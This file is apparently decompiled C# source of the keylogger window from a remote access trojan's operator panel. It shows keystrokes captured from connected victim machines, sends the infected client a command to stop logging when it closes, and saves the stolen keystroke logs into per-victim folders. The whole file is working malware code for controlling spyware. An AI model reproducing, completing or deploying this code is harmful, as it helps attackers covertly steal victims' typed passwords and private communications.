using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200006A RID: 106
	public partial class FormKeylogger : Form
	{
		// Token: 0x06000254 RID: 596 RVA: 0x0001C5D8 File Offset: 0x0001A7D8
		public FormKeylogger()
		{
			this.InitializeComponent();
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x06000255 RID: 597 RVA: 0x0001C5F1 File Offset: 0x0001A7F1
		// (set) Token: 0x06000256 RID: 598 RVA: 0x0001C5F9 File Offset: 0x0001A7F9
		public Form1 F { get; set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000257 RID: 599 RVA: 0x0001C602 File Offset: 0x0001A802
		// (set) Token: 0x06000258 RID: 600 RVA: 0x0001C60A File Offset: 0x0001A80A
		internal Clients Client { get; set; }

		// Token: 0x06000259 RID: 601 RVA: 0x0001C614 File Offset: 0x0001A814
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600025A RID: 602 RVA: 0x0001C654 File Offset: 0x0001A854
		private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			StringBuilder sb = this.Sb;
			if (sb != null)
			{
				sb.Clear();
			}
			if (this.Client != null)
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "keyLogger";
					msgPack.ForcePathObject("isON").AsString = "false";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				});
			}
		}

		// Token: 0x0600025B RID: 603 RVA: 0x0001C684 File Offset: 0x0001A884
		private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			this.richTextBox1.SelectionStart = 0;
			this.richTextBox1.SelectAll();
			this.richTextBox1.SelectionBackColor = Color.White;
			if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
			{
				int num;
				for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
				{
					num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
					if (num == -1)
					{
						break;
					}
					this.richTextBox1.SelectionStart = num;
					this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
					this.richTextBox1.SelectionBackColor = Color.Yellow;
				}
			}
		}

		// Token: 0x0600025C RID: 604 RVA: 0x0001C754 File Offset: 0x0001A954
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID + "\\Keylogger");
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllText(text + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
		}

		// Token: 0x04000223 RID: 547
		public StringBuilder Sb = new StringBuilder();
	}
}
